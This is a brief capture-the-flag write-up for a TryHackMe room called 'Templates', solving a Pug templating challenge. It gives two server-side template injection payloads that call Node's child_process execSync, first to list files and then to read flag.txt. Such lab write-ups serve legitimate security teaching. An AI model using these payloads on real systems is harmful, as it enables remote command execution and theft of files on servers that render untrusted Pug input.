# [Templates](https://tryhackme.com/room/templates)

## Pug is my favorite templating engine! I made this super slick application so you can play around with Pug and see how it works.

My favourite type of dog is a pug... and, you know what, Pug is my favourite templating engine too! I made this super slick application so you can play around with Pug and see how it works. Seriously, you can do so much with Pug!

### Hack the application and uncover a flag!

1. First, test code execution with a harmless command:

```
h1 #{process.mainModule.require('child_process').execSync('ls').toString()}
```

2. Once command execution works, read the flag file:

```
h1 #{process.mainModule.require('child_process').execSync('cat flag.txt').toString()}
```

[SCREEN01]
